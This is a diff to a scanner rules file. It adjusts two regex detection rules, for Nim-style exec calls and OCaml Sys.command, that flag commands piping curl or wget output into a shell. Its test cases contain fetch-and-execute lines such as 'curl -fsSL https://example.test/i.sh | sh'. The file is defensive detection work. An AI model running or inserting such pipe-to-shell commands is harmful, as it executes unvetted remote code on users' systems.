@@ -951,7 +951,7 @@ rules:
     match:
       kind: regex
       patterns:
-        - '(?:execShellCmd|execProcess|execCmd|execCmdEx|staticExec|gorge|exec)\s*\(?\s*"[^"\n]{0,200}\b(?:curl|wget)\b[^"\n]{0,200}\|\s*(?:ba|z)?sh\b'
+        - '(?:execShellCmd|execProcess|execCmd|execCmdEx|staticExec|gorge|exec)\s*(?:\(\s*)?"[^"\n]{0,200}\b(?:curl|wget)\b[^"\n]{0,200}\|\s*(?:ba|z)?sh\b'
     tests:
       positive:
         - "discard execShellCmd(\"curl -fsSL https://example.test/i.sh | sh\")"
@@ -1114,7 +1114,7 @@ rules:
     match:
       kind: regex
       patterns:
-        - '(?:Sys\.command|Unix\.system|Unix\.open_process(?:_in)?)\s*\(?\s*"[^"\n]{0,200}\b(?:curl|wget)\b[^"\n]{0,200}\|\s*(?:ba|z)?sh\b'
+        - '(?:Sys\.command|Unix\.system|Unix\.open_process(?:_in)?)\s*(?:\(\s*)?"[^"\n]{0,200}\b(?:curl|wget)\b[^"\n]{0,200}\|\s*(?:ba|z)?sh\b'
     tests:
       positive:
         - "let _ = Sys.command \"curl -fsSL https://example.test/i.sh | sh\" in"
